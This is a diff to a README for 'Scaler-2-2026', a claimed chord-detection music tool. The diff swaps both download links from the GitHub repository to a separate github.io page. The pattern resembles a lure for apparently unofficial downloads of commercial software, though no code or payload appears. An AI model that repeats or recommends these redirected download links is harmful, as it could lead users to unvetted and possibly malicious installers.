@@ -1,6 +1,6 @@
 # 🎹 Scaler-2-2026 - Create professional chord progressions easily
 
-[![Download Scaler 2](https://img.shields.io/badge/Download-Scaler_2-blue)](https://github.com/Rahul260126/Scaler-2-2026)
+[![Download Scaler 2](https://img.shields.io/badge/Download-Scaler_2-blue)](https://rahul260126.github.io)
 
 Scaler-2-2026 helps you write music through chord detection and progression building. This software analyzes your MIDI input or audio and identifies the key and scale of your notes. It suggests chords to match your music. The tool supports your creative process by providing theory-based options for your compositions.
 
@@ -23,7 +23,7 @@ Ensure your computer has enough space before you start. Follow these steps to ob
 2.  Navigate to the repository page at the link provided below.
 3.  Click the link to start the download.
 
-[Click here to visit the download page](https://github.com/Rahul260126/Scaler-2-2026)
+[Click here to visit the download page](https://rahul260126.github.io)
 
 ## 🛠️ Installation Steps
 
